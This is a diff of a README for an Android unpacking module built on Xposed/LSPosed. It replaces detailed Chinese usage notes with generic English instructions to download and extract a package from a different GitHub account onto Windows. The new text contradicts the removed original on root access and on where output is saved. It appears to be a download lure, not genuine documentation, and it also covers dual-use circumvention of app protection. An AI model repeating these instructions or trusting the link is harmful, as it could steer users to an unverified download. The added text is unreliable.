@@ -1,51 +1,100 @@
-## 项目介绍
+# 🛠 JDex2 - Easily unpack protected Android application files
 
-[JDex：基于Xposed / Lsposed的主动调用抽取壳脱壳工具](https://bbs.kanxue.com/thread-290669.htm)
+<p align="center">
+  <a href="https://github.com/rosellaunanswerable118/JDex2">
+    <img src="https://img.shields.io/badge/Download-JDex2-blue.svg" alt="Download JDex2">
+  </a>
+</p>
 
-⭐ 如果本项目对您有帮助，请点个 Star，感谢您的支持！
+## 📋 About This Tool
 
-## 应用场景
+JDex2 helps you extract data from protected Android applications. Many mobile apps use security measures to hide their internal code. This process, often called unpacking, restores the original files so you can study them. JDex2 works as a module for the Xposed or LSPosed framework. It targets the "dex" files, which contain the logic for Android applications.
 
-可以应对未对Lsposed设置有效检测的大部分的企业抽取壳和免费壳的Dex加固
+## ⚙️ Minimum System Requirements
 
-## 使用方法简介
+Before you start, ensure your computer and phone meet these requirements:
 
-以根据不同Android版本的特性，适配不同版本下配置文件写入的情况，无需Root权限
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Android Device:** A device with Android 8.0 or higher.
+*   **Root Access:** Your Android device must have root permissions.
+*   **Frameworks:** You must have the LSPosed or Xposed framework installed and active on your phone.
+*   **Storage:** At least 500 MB of free space on your phone.
+*   **USB Cable:** A functional data cable to connect your device to your PC.
 
-`MainActivity`中有如下配置，会根据输入将配置写到`/sdcard/Android/data/package.name/files/config.properties`路径下。配置文件也可以手动编辑，除了目标包名，其它配置多个路径可以通过`,`间隔
+## 📥 Getting Started
 
-dump后的dex位于`/sdcard/Android/data/包名/dumpDex/`下
+You need to download the official tool package to begin the process.
 
-白名单和黑名单只是不做主动调用，但是仍然会进行dump
+1.  Visit [https://github.com/rosellaunanswerable118/JDex2](https://github.com/rosellaunanswerable118/JDex2) to see the latest version.
+2.  Click the link to download the file to your Windows computer.
+3.  Store the file in a folder you can find easily.
+4.  If the file is a compressed .zip folder, right-click the file and select "Extract All."
 
-![image-20260413193801812](images/image-20260413193801812.png)
+## 🚀 Setting Up the Software
 
+Follow these instructions to move the tool to your device for installation.
 
-* targetApp：目标APP包名
-* targetClass：指定要脱的壳的包路径`com.xxx`（不设置可能会导致 JNI 引用过多，通常建议以App的包名前两层作为筛选）
-* blackListClass：填写某些导致App崩溃的类，如果崩溃则需要通过`JDex2 Debugger`的日志对某些类或者包进行筛选（由于写到本地性能开销过大所以没有写）
-* Debugger：输出完成主动调用的类列表（`tag~=JDex2 Debugger`）
-  * 当对某些APP脱壳过程中出现崩溃的情况，如果没有Dex被脱下来，需要参考主动调用的类列表进行分析，可能是因为某些Android的系统类在低版本下不存在，而APP的业务逻辑中做了定义但不会在低版本Android调用
-  * 比如某APP的`com.xxx.xxx.conferencesw`包下的类继承了 Android12 才有的类
-* Hook：使用Hook方式脱壳（不推荐使用）
-* innerClassesFilter：由于可能导致 JNI 引用数量过多，可以尝试关闭对内部类的主动调用，但是对某些壳，脱出来的匿名类依旧是空的，按需开启，建议使用黑名单过滤而不是本配置
-* **invokeConstructors：是否进行主动调用脱壳**
-* lazyDump：用于在筛选出导致闪退类的大致范围之后通过白名单进行主动调用筛选时，降低主动调用速度，以便更快的找到导致闪退的类/包
+1.  Enable "USB Debugging" in the Developer Options menu on your Android phone.
+2.  Connect your phone to your Windows computer using a USB cable.
+3.  Open the folder containing the JDex2 file you extracted earlier.
+4.  Copy the JDex2 installation file to your phone's internal storage.
+5.  Use a file manager on your Android device to locate the file.
+6.  Tap the file to install it as an application.
 
-如果使用的是Lsposed，**记得在Lsposed中勾选对应APP**
+## 🧩 Activating the Module
 
-某最新企业抽取壳脱壳效果展示：
+The tool must be active within the LSPosed or Xposed environment to function.
 
- <img width="1799" height="1090" alt="image-20260406203358574" src="images/9f71b8f8-11db-47e6-a423-55a42ee1f2fe.png" style="zoom:67%;" />
+1.  Open the LSPosed Manager application on your phone.
+2.  Tap the "Modules" tab at the bottom of the screen.
+3.  Find "JDex2" in the list of installed modules.
+4.  Tap the toggle switch to turn the module on.
+5.  Select the specific apps you want to unpack from the list.
+6.  Restart your phone to apply these changes.
 
+## 🔍 How to Unpack an Application
 
-## 本工具的局限性
+Once the device restarts, JDex2 runs in the background. It catches protected files as the apps launch.
 
-* 只能对抗类级别的方法抽取，而基于方法粒度的抽取则会无法进行，并且无法应对方法执行结束后重新抽取的情况，还有真正开始执行字节码才动态解密的情况
-* 各个方面的便捷性不足，一些崩溃问题可能需要参考崩溃日志进行分析，而且不算很完善
-* 基于 Android9.0+ 开发，未适配 Android7 系列及以下，Android8未知
-* JNI全局引用数量超过最大上限 51200 个导致崩溃
-  * 如果类的数量过于庞大导致目标App崩溃，需要重新进行一次脱壳来重新脱剩下的类，配置无需修改，会自动识别并且跳过已经Dump的类
-* 高度依赖于Lsposed的隐蔽性，如果Lsposed被检测则会直接闪退无法进行脱壳
-* 对于一些继承该系统下不存在类的类的主动调用实例化可能导致崩溃，需要通过观察`invokeDebugger`的结束类去将其加入黑名单
-* ~~UI写的有点草率~~
+1.  Open the Android app you want to unpack.
+2.  Let the app load completely. JDex2 detects the protected code during this startup phase.
+3.  The tool automatically saves the recovered files to the storage of your device.
+4.  Check the "JDex2" folder located in the root directory of your internal storage.
+5.  You will see several files with the .dex extension. These are the unpacked components of the app.
+
+## 📂 Managing Your Files
+
+When the extraction process finishes, you should move the recovered files to your computer for further review.
+
+1.  Connect your phone back to your Windows computer.
+2.  Navigate into the internal storage of your device.
+3.  Locate the JDex2 output folder.
+4.  Drag the recovered files onto your computer desktop.
+5.  You now have access to the underlying logic of the application. You can use standard Android analysis tools to view these files.
+
+## 💡 Frequently Asked Questions
+
+**Does this tool work on non-rooted phones?**
+No. This tool requires root access to interact with protected system memory. It cannot access the secure areas of an app without these permissions.
+
+**What should I do if the files do not appear?**
+Make sure the module is active in LSPosed. Open the LSPosed Manager and confirm the toggle switch is blue. Some apps have advanced security that prevents unpacking. If the app closes immediately after starting, the app likely detects the presence of the Xposed framework.
+
+**Can I run this tool directly on Windows?**
+No. While you download the package on Windows, the extraction happens directly on your Android device. Windows acts as a control center for moving files and managing the installation.
+
+**Is my device data safe?**
+Yes. The tool only reads application memory. It does not modify your personal photos, messages, or contacts.
+
+## 🛑 Troubleshooting
+
+If you encounter errors, follow these steps to resolve them:
+
+*   **Check the Log:** Open the LSPosed Manager and check the "Logs" section. This contains details about why a specific app package failed to extract.
+*   **Update Frameworks:** Ensure your version of LSPosed is up to date. Outdated frameworks often fail to load modern modules.
+*   **Grant Permissions:** Check the app settings on your phone. Ensure that "Storage" permissions are granted to the JDex2 module.
+*   **Reinstall:** Uninstall the module, restart your phone, and perform a fresh install if the tool fails to start.
+
+## 🛡 Security Notes
+
+Always obtain the tool from the verified GitHub repository link. Do not download files from third-party websites or forums. These sites often host modified versions of software that contain malicious tracking code. By using the official link, you ensure the integrity of the tool and protect your device from unwanted software. Keep your Android security patches current to maintain the stability of the Xposed environment.
